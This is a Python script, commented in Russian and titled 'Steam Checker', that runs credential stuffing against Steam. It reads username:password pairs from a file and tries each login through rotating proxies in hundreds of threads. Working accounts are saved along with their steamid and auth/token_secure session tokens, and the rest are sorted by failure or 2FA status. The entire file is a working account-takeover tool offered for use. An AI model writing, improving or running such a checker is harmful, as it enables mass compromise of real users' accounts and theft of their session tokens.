import os
import datetime
from random import choice
from base64 import b64encode
import requests
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from concurrent.futures import ThreadPoolExecutor
from art import tprint
from loguru import logger

'''Очистим командную строку'''
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
clear()

'''Красивый вывод'''
tprint('Steam Checker')

'''Дата запуска скрипта(текущая)'''
date = datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")

'''Добавлем прокси'''
try:
    proxy = open("proxy.txt", encoding='utf-8').read().strip('\n').split('\n')
except:
    logger.critical('Файл proxy.txt отсутствует')
    input()
    exit()


def decryption(nickname, password):
    prox = choice(proxy)
    res = requests.post("https://steamcommunity.com/login/getrsakey/", data={"username": nickname})
    publickey_mod = int(res.json()['publickey_mod'], 16)
    publickey_exp = int(res.json()['publickey_exp'], 16)
    timestamp = res.json()['timestamp']
    '''Создаем ключ RSA из кортежа допустимых компонентов RSA.'''
    rsa_key = RSA.construct((publickey_mod, publickey_exp))
    '''Создаем шифр для выполнения (де)шифрования'''
    pks_cipher = PKCS1_v1_5.new(rsa_key)
    '''(де)шифруем сообщение'''
    encrypted_message = pks_cipher.encrypt(bytes(password, 'utf-8'))
    encode_message = b64encode(encrypted_message)
    encode_message = str(encode_message).split("'")[1]
    while True:
    # for i in range(1):
        try:
            prox = f"{choice(proxy)}"
            res = requests.post("https://steamcommunity.com/login/dologin/", data={"username": nickname, "password": encode_message, "rsatimestamp": timestamp},
            proxies={"http": prox})
            result = res.json()
            '''Сортируем акки по результатам запроса'''
            if result["success"]:
                steam_id = result["transfer_parameters"]["steamid"]
                token_secure = result["transfer_parameters"]["token_secure"]
                auth = result["transfer_parameters"]["auth"]
                with open(f"./results/{date}/#work.txt", "a+") as file:
                    file.write(f"{nickname}:{password}|steamid:{steam_id}|token_secure:{token_secure}|auth:{auth})\n")
                logger.success(f'{nickname}:{password} | proxy: {prox}')
                break

            elif result["message"] == "The account name or password that you have entered is incorrect.":
                with open(f"./results/{date}/#bad.txt", "a+") as file:
                    file.write(f"{nickname}:{password}\n")
                logger.error(f'BAD | {nickname}:{password} | proxy: {prox}')
                break

            elif result["requires_twofactor"]:
                with open(f"./results/{date}/#2fa.txt", "a+") as file:
                    file.write(f"{nickname}:{password}\n")
                logger.error(f'2FA | {nickname}:{password} | proxy: {prox}')
                break

            elif result["emailauth_needed"]:
                with open(f"./results/{date}/#mfa.txt", "a+") as file:
                    file.write(f"{nickname}:{password}|steamid:{result['emailsteamid']}\n")
                logger.error(f'MFA | {nickname}:{password} | proxy: {prox}')
                break

            else:
                continue
        except Exception as e:
            continue

if __name__ == "__main__":
    '''Вводим кол-во потоков'''
    amount_threads = input("Введите кол-во потоков (рекомендуется 100 - 500): ")
    with ThreadPoolExecutor(max_workers=int(amount_threads)) as executor:
        try:
            '''Считываем файл с данными в переменную в виде списка'''
            with open('data.txt') as file:
                data = file.read().strip('\n').split("\n")
        except:
            logger.critical("Файл data.txt не найден")
            input()
            exit()
        os.makedirs(f"./results/{date}")
        for log in data:
            nickname, password = log.split(':')
            executor.submit(decryption, nickname, password)
